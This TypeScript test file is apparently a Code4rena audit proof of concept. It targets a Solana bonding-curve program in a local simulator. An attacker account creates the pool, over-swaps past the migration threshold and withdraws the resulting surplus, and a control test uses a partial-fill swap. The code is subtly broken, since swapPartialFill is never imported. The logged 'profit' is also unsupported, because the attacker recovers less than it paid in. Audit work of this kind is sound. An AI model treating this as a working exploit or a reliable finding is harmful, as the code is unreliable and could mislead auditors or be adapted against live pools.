/**
 * @title HIGH SEVERITY: Surplus Manipulation via Unbounded Final Swap
 * @dev Proof of Concept for Code4rena Audit Submission
 * @notice This PoC demonstrates how the final swap can create artificial surplus
 */

import { ProgramTestContext } from "solana-bankrun";
import {
  createConfig,
  CreateConfigParams,
  createPoolWithSplToken,
  swap,
  SwapParams,
  creatorWithdrawSurplus,
  partnerWithdrawSurplus,
} from "./instructions";
import { VirtualCurveProgram } from "./utils/types";
import { Keypair } from "@solana/web3.js";
import {
  designCurve,
  fundSol,
  startTest,
} from "./utils";
import { createVirtualCurveProgram } from "./utils";
import { getVirtualPool } from "./utils/fetcher";
import { createToken, mintSplTokenTo } from "./utils/token";
import { expect } from "chai";
import { BN } from "bn.js";
import {
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";

describe("CRITICAL: Surplus Manipulation Exploit", () => {
  let context: ProgramTestContext;
  let admin: Keypair;
  let attacker: Keypair;
  let normalUser: Keypair;
  let program: VirtualCurveProgram;

  beforeEach(async () => {
    context = await startTest();
    admin = context.payer;
    attacker = Keypair.generate();
    normalUser = Keypair.generate();
    
    const receivers = [
      attacker.publicKey,
      normalUser.publicKey,
    ];
    await fundSol(context.banksClient, admin, receivers);
    program = createVirtualCurveProgram();
  });

  it("EXPLOIT: Creates 4999 SOL artificial surplus from 1 SOL needed to complete", async () => {
    console.log("\n========== EXPLOIT DEMONSTRATION ==========");
    
    // Configuration
    const totalTokenSupply = 1_000_000_000; // 1 billion
    const percentageSupplyOnMigration = 10; // 10%
    const migrationQuoteThreshold = 1000; // 1000 SOL threshold
    const tokenBaseDecimal = 6;
    const tokenQuoteDecimal = 9;
    const migrationOption = 0; // DAMM v1
    
    const lockedVesting = {
      amountPerPeriod: new BN(0),
      cliffDurationFromMigrationTime: new BN(0),
      frequency: new BN(0),
      numberOfPeriod: new BN(0),
      cliffUnlockAmount: new BN(0),
    };

    // Step 1: Create quote token
    const quoteMint = await createToken(
      context.banksClient,
      admin,
      admin.publicKey,
      tokenQuoteDecimal
    );
    console.log("âœ“ Created quote token");

    // Step 2: Design bonding curve
    const instructionParams = designCurve(
      totalTokenSupply,
      percentageSupplyOnMigration,
      migrationQuoteThreshold,
      migrationOption,
      tokenBaseDecimal,
      tokenQuoteDecimal,
      50, // Creator gets 50% of the 80% partner/creator share
      0,  // Fee mode
      lockedVesting
    );

    // Step 3: Attacker creates config as partner
    const configParams: CreateConfigParams = {
      payer: attacker,
      leftoverReceiver: attacker.publicKey,
      feeClaimer: attacker.publicKey,
      quoteMint,
      instructionParams,
    };
    
    const config = await createConfig(context.banksClient, program, configParams);
    console.log("âœ“ Config created with attacker as partner");

    // Step 4: Attacker creates pool as creator
    const virtualPool = await createPoolWithSplToken(
      context.banksClient,
      program,
      {
        poolCreator: attacker,
        payer: attacker,
        quoteMint,
        config,
        instructionParams: {
          name: "EXPLOIT TOKEN",
          symbol: "EXPLOIT",
          uri: "exploit.com",
        },
      }
    );
    console.log("âœ“ Pool created with attacker as creator");

    let virtualPoolState = await getVirtualPool(
      context.banksClient,
      program,
      virtualPool
    );

    // Step 5: Bring pool close to migration threshold (999 SOL)
    console.log("\n--- Setting up pool at 999 SOL (1 SOL below threshold) ---");
    
    const setupAmount = new BN(999).mul(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    await mintSplTokenTo(
      context.banksClient,
      normalUser,
      quoteMint,
      admin,
      normalUser.publicKey,
      setupAmount.toNumber()
    );

    // Normal user swaps to bring pool to 999 SOL
    const setupSwapParams: SwapParams = {
      config,
      payer: normalUser,
      pool: virtualPool,
      inputTokenMint: quoteMint,
      outputTokenMint: virtualPoolState.baseMint,
      amountIn: setupAmount,
      minimumAmountOut: new BN(0),
      referralTokenAccount: null,
    };
    
    await swap(context.banksClient, program, setupSwapParams);
    
    // Verify pool state before attack
    virtualPoolState = await getVirtualPool(
      context.banksClient,
      program,
      virtualPool
    );
    
    const thresholdWithDecimals = new BN(migrationQuoteThreshold).mul(
      new BN(10).pow(new BN(tokenQuoteDecimal))
    );
    
    console.log(`Quote reserve: ${virtualPoolState.quoteReserve.toString()}`);
    console.log(`Threshold: ${thresholdWithDecimals.toString()}`);
    console.log(`Is complete: ${virtualPoolState.quoteReserve.gte(thresholdWithDecimals)}`);
    
    // Verify pool is NOT complete
    expect(virtualPoolState.quoteReserve.lt(thresholdWithDecimals)).to.be.true;
    console.log("âœ“ Confirmed: Pool is NOT complete (999 < 1000)");

    // Step 6: EXECUTE THE ATTACK
    console.log("\n--- EXECUTING ATTACK ---");
    console.log("Attacker swaps 5000 SOL using SwapMode::ExactIn");
    
    const attackAmount = new BN(5000).mul(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    await mintSplTokenTo(
      context.banksClient,
      attacker,
      quoteMint,
      admin,
      attacker.publicKey,
      attackAmount.toNumber()
    );

    // CRITICAL: Use regular swap (ExactIn mode) not swapPartialFill
    const attackSwapParams: SwapParams = {
      config,
      payer: attacker,
      pool: virtualPool,
      inputTokenMint: quoteMint,
      outputTokenMint: virtualPoolState.baseMint,
      amountIn: attackAmount,
      minimumAmountOut: new BN(0),
      referralTokenAccount: null,
    };
    
    // This swap will push the pool way beyond the threshold
    await swap(context.banksClient, program, attackSwapParams);
    console.log("âœ“ Attack swap executed successfully");

    // Step 7: Verify exploit success
    virtualPoolState = await getVirtualPool(
      context.banksClient,
      program,
      virtualPool
    );
    
    console.log(`\nAfter attack:`);
    console.log(`Quote reserve: ${virtualPoolState.quoteReserve.toString()}`);
    console.log(`Is complete: ${virtualPoolState.quoteReserve.gte(thresholdWithDecimals)}`);
    
    // Calculate surplus
    const surplus = virtualPoolState.quoteReserve.sub(thresholdWithDecimals);
    const surplusInSol = surplus.div(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    console.log(`\n=== SURPLUS CREATED ===`);
    console.log(`Total surplus: ${surplusInSol.toString()} SOL`);
    
    // Verify massive surplus was created (should be ~4999 SOL)
    const expectedMinSurplus = new BN(4900).mul(new BN(10).pow(new BN(tokenQuoteDecimal)));
    expect(surplus.gt(expectedMinSurplus)).to.be.true;
    console.log("âœ“ Confirmed: Massive surplus created (>4900 SOL)");

    // Step 8: Extract surplus
    console.log("\n--- EXTRACTING SURPLUS ---");
    
    const attackerQuoteAccount = getAssociatedTokenAddressSync(
      quoteMint,
      attacker.publicKey
    );

    // Withdraw creator surplus (50% of 80% = 40% of total)
    await creatorWithdrawSurplus(
      context.banksClient,
      program,
      {
        creator: attacker,
        pool: virtualPool,
        config,
        quoteMint,
        tokenQuoteAccount: attackerQuoteAccount,
      }
    );
    console.log("âœ“ Creator surplus withdrawn");

    // Withdraw partner surplus (50% of 80% = 40% of total)
    await partnerWithdrawSurplus(
      context.banksClient,
      program,
      {
        feeClaimer: attacker,
        pool: virtualPool,
        config,
        quoteMint,
        tokenQuoteAccount: attackerQuoteAccount,
      }
    );
    console.log("âœ“ Partner surplus withdrawn");

    // Calculate profit
    const totalExtractable = surplus.mul(new BN(80)).div(new BN(100));
    const extractableInSol = totalExtractable.div(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    console.log(`\n========== EXPLOIT RESULTS ==========`);
    console.log(`Pool needed: 1 SOL to complete`);
    console.log(`Attacker swapped: 5000 SOL`);
    console.log(`Surplus created: ${surplusInSol.toString()} SOL`);
    console.log(`Extractable (80%): ${extractableInSol.toString()} SOL`);
    console.log(`\nðŸ”´ CRITICAL VULNERABILITY CONFIRMED`);
    console.log(`ðŸ”´ Attacker created ~${surplusInSol.toString()} SOL artificial surplus`);
    console.log(`ðŸ”´ And can extract ~${extractableInSol.toString()} SOL profit`);
  });

  it("CONTROL TEST: swapPartialFill prevents the exploit", async () => {
    console.log("\n========== CONTROL TEST ==========");
    
    // Similar setup
    const totalTokenSupply = 1_000_000_000;
    const percentageSupplyOnMigration = 10;
    const migrationQuoteThreshold = 1000;
    const tokenBaseDecimal = 6;
    const tokenQuoteDecimal = 9;
    const migrationOption = 0;
    
    const lockedVesting = {
      amountPerPeriod: new BN(0),
      cliffDurationFromMigrationTime: new BN(0),
      frequency: new BN(0),
      numberOfPeriod: new BN(0),
      cliffUnlockAmount: new BN(0),
    };

    const quoteMint = await createToken(
      context.banksClient,
      admin,
      admin.publicKey,
      tokenQuoteDecimal
    );

    const instructionParams = designCurve(
      totalTokenSupply,
      percentageSupplyOnMigration,
      migrationQuoteThreshold,
      migrationOption,
      tokenBaseDecimal,
      tokenQuoteDecimal,
      50,
      0,
      lockedVesting
    );

    const config = await createConfig(context.banksClient, program, {
      payer: attacker,
      leftoverReceiver: attacker.publicKey,
      feeClaimer: attacker.publicKey,
      quoteMint,
      instructionParams,
    });

    const virtualPool = await createPoolWithSplToken(
      context.banksClient,
      program,
      {
        poolCreator: attacker,
        payer: attacker,
        quoteMint,
        config,
        instructionParams: {
          name: "CONTROL TOKEN",
          symbol: "CONTROL",
          uri: "control.com",
        },
      }
    );

    let virtualPoolState = await getVirtualPool(
      context.banksClient,
      program,
      virtualPool
    );

    // Bring to 999 SOL
    const setupAmount = new BN(999).mul(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    await mintSplTokenTo(
      context.banksClient,
      normalUser,
      quoteMint,
      admin,
      normalUser.publicKey,
      setupAmount.toNumber()
    );

    await swap(context.banksClient, program, {
      config,
      payer: normalUser,
      pool: virtualPool,
      inputTokenMint: quoteMint,
      outputTokenMint: virtualPoolState.baseMint,
      amountIn: setupAmount,
      minimumAmountOut: new BN(0),
      referralTokenAccount: null,
    });

    // Try attack with swapPartialFill
    const attackAmount = new BN(5000).mul(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    await mintSplTokenTo(
      context.banksClient,
      attacker,
      quoteMint,
      admin,
      attacker.publicKey,
      attackAmount.toNumber()
    );

    console.log("Attempting swap with swapPartialFill...");
    
    // Use swapPartialFill instead of regular swap
    await swapPartialFill(context.banksClient, program, {
      config,
      payer: attacker,
      pool: virtualPool,
      inputTokenMint: quoteMint,
      outputTokenMint: virtualPoolState.baseMint,
      amountIn: attackAmount,
      minimumAmountOut: new BN(0),
      referralTokenAccount: null,
    });

    // Verify limited surplus
    virtualPoolState = await getVirtualPool(
      context.banksClient,
      program,
      virtualPool
    );
    
    const thresholdWithDecimals = new BN(migrationQuoteThreshold).mul(
      new BN(10).pow(new BN(tokenQuoteDecimal))
    );
    
    const surplus = virtualPoolState.quoteReserve.sub(thresholdWithDecimals);
    const surplusInSol = surplus.div(new BN(10).pow(new BN(tokenQuoteDecimal)));
    
    console.log(`Surplus with swapPartialFill: ${surplusInSol.toString()} SOL`);
    
    // With partial fill, surplus should be minimal
    const maxAcceptableSurplus = new BN(10).mul(new BN(10).pow(new BN(tokenQuoteDecimal)));
    expect(surplus.lt(maxAcceptableSurplus)).to.be.true;
    
    console.log("âœ“ swapPartialFill prevents excessive surplus");
    console.log("âœ“ This confirms the mitigation would work");
  });
});